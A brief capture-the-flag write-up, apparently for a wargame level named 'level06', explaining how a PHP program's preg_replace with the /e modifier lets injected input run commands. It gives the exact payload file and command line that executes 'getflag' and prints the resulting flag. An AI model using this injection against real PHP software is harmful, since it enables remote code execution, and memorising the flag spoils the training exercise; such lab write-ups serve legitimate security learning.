The php program get the content of the file given with av[1] and substring the content with the regex "/(\[x (.*)\])/e".
This substring is use in the second argument of the following instruction: 
preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")"
At this moment with 'e' regex modifier, we can inject our malicous code (the substring "${$z(getflag)}") before the y function is called : we encapsule a variable inside another to eval our string given in av[2] ("system").
So to achieve all this stuff, we create the file used for av[1]:
echo '[x ${`getflag`}]' > /tmp/file
And we start the program with these arguments:
./level06 /tmp/file system
Here's the flag the flag is 'wiok45aaoguiboiki2tuin6ub'.